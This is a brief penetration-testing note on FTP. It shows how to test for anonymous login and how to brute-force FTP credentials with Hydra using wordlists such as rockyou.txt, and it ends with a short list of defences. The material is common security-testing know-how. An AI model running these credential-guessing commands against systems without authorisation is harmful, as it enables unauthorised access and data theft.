---
tags:
  - "#ftp"
  - "#scan"
  - credentials
  - "#password-cracking"
  - "#anonymous"
  - "#hydra"
---
---

## Testing Anonymous FTP Login

Some FTP servers allow anonymous login, which can be checked using:

```bash
ftp <target-ip>
```

When prompted for a username, enter:

```bash
anonymous
```

For the password, try an empty value or `anonymous@domain.com`.

If access is granted, the FTP server allows anonymous connections, which can expose sensitive files.

To list files after logging in:

```bash
ls
```

To download a file:

```bash
get <filename>
```

---

## Brute-Forcing FTP Credentials with Hydra

Hydra can be used to test FTP login security by brute-forcing credentials.

### a) Brute-Forcing FTP with a Known Username

If a valid username is known, use:

```bash
hydra -l <username> -P <password-list.txt> ftp://<target-ip> -t 15
```

Example:

```bash
hydra -l admin -P rockyou.txt ftp://192.168.1.100 -t 15
```

### b) Brute-Forcing FTP Without Knowing the Username

If the username is unknown, use a list of possible usernames:

```bash
hydra -L <username-list.txt> -P <password-list.txt> ftp://<target-ip> -t 15
```

Example:

```bash
hydra -L users.txt -P passwords.txt ftp://192.168.1.100 -t 15
```

---

## Preventing Unauthorized FTP Access

- **Disable anonymous FTP login** if not required.
- **Use strong passwords** to prevent brute-force attacks.
- **Limit failed login attempts** to mitigate brute-force risks.
- **Restrict FTP access** to authorized IPs only.
- **Monitor FTP logs** for unusual login attempts.
